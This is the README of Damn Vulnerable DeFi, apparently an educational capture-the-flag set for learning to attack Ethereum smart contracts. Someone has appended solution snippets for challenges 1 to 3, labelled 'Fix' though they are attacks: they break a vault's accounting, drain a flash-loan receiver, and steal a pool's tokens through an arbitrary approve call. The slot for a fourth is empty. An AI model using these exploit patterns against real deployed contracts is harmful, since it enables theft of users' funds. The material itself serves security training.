![](cover.png)

**A set of challenges to learn offensive security of smart contracts in Ethereum.**

Featuring flash loans, price oracles, governance, NFTs, lending pools, smart contract wallets, timelocks, and more!

## Play

Visit [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz)

## Help

For Q&A and troubleshooting running Damn Vulnerable DeFi, go [here](https://github.com/tinchoabbate/damn-vulnerable-defi/discussions/categories/support-q-a-troubleshooting).

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION.

Fix #1:        
````
// lets transfer some amount directly to vault and make the if logic fail forever
await token.connect(player).transfer(vault.address, 10);
````

#Fix #2:

````
await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
````

#Fix #3:
````
let interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
await pool.connect(player).flashLoan(0, player.address, token.address, data);
await token.connect(player).transferFrom(pool.address, player.address,  TOKENS_IN_POOL);
````

#Fix #4: [Challenge #4 - Side Entrance]

```
```